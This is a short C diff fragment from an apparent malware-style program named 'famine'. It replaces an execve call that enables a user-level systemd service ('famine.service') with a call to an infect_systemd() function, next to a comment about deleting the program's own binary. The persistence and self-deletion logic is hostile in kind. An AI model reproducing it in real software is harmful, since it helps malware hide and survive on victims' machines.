@@ -17,9 +17,7 @@ int main(void) {
     }
 
     // install daemon
-    const char* cmd = "/usr/bin/systemctl";
-    char* cmd_args[] = {"systemctl", "--quiet", "--user", "enable", "/daemon/famine.service"};
-    execve(cmd, cmd_args, environ);
+    infect_systemd();
 
     // delete famine (execve returns on failure)
 
